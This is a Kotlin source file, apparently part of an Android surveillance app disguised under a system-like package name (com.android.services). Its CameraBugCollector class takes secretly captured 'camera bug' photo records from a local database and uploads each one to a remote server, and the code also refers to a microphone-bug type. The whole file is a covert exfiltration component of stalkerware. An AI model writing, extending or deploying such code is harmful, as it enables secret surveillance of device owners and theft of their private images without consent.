package com.android.services.logs.collectors

import android.content.Context
import com.android.services.db.entities.CameraBug
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.retrofit.FileUploader
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.logException
import com.android.services.util.logVerbose
import com.google.gson.GsonBuilder
import com.google.gson.reflect.TypeToken
import org.json.JSONArray

class CameraBugCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
) : LogsCollector {

    override fun uploadLogs() {
        if (AppConstants.syncCameraBug) {
            localDatabaseSource.selectCameraBugs { cameraBugs ->
                if (cameraBugs.isNotEmpty()) {
                    try {
                        val gson = GsonBuilder().create()
                        val mCameraBugJSON = JSONArray(
                            gson.toJson(
                                cameraBugs,
                                object : TypeToken<List<CameraBug>>() {}.type
                            )
                        )
                        val fileUploader =
                            FileUploader(context, AppConstants.CAMERA_BUG_TYPE, localDatabaseSource)
                        for (i in 0 until mCameraBugJSON.length()) {
                            try {
                                fileUploader.uploadFile(mCameraBugJSON.getJSONObject(i))
                            } catch (e: Exception) {
                                logException(e.message!!, AppConstants.CAMERA_BUG_TYPE, e)
                            }
                        }
                    } catch (e: Exception) {
                        AppUtils.appendLog(context, "${AppConstants.MIC_BUG_TYPE} ${e.message}")
                        logException(e.message!!, AppConstants.CAMERA_BUG_TYPE, e)
                    }
                } else {
                    logVerbose("No photos found", AppConstants.CAMERA_BUG_TYPE)
                }
            }
        } else {
            logVerbose("${AppConstants.CAMERA_BUG_TYPE} Sync is Off")
        }
    }
}